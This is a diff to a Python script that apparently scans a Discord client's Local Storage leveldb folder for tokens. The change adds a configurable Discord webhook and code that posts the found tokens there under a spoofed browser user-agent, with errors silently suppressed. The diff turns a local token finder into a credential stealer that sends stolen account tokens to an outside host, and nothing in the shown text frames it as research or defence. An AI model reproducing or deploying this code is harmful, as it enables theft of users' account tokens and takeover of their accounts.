@@ -3,6 +3,12 @@ import re
 import json
 import platform
 
+# enable or not sending token to a Discord server
+WEBHOOK_ENABLE = False
+
+# your Discord webhook URL
+WEBHOOK_URL = 'WEBHOOK HERE'
+
 def find_tokens(path):
     path += '/Local Storage/leveldb'
 
@@ -78,7 +84,24 @@ def main():
         else:
             message += '\033[0;31mNo tokens found.\033[0m\n'
 
-    print(f'{message}')
+    if WEBHOOK_ENABLE == False:
+        print(f'{message}')
+
+    elif WEBHOOK_ENABLE == True:
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+        }
+
+        payload = json.dumps({'content': f'```txt{message}```'})
+
+        try:
+            from urllib.request import Request, urlopen
+            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+            urlopen(req)
+            print('Result has been sent to the discord server.')
+        except:
+            pass
 
 if __name__ == '__main__':
     main()
